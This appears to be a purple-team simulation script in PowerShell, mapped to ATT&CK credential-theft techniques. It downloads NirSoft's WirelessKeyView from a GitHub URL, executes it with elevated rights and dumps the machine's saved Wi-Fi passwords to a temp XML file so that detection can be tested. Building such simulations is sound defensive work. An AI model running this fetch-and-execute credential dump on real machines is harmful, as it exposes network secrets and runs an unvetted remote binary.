<#
    T1588.002 - Obtain Capabilities: Tool
    T1555 - Credentials from Password Stores
    Extract Wireless passwords from Windows with Nirsoft tool WirelessKeyView.exe
    Download WirelessKeyView.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WirelessKeyView.exe and execute it 
    Need elevated privileges
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

if([System.IntPtr]::Size -eq 4){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WirelessKeyView.exe"
}
elseif([System.IntPtr]::Size -eq 8){
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WirelessKeyView_x64.exe"
}
else{
    Write-Host -ForegroundColor Yellow "Warning: OS architecture could not be detected, downloading x32 version of WirelessKeyView.exe ..."
    $url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WirelessKeyView.exe"
}

$dumpfile = "$env:tmp\wifi_keys.xml"
$outfile = "$env:tmp\wifi_keys.exe"

# Download and execute BulletsPassView
try {
    Invoke-WebRequest $url -OutFile $outfile -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: WirelessKeyView.exe downloaded to $outfile"
        & $outfile /sxml $dumpfile
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download WirelessKeyView.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Wireless keys extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to extract Wireless keys to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
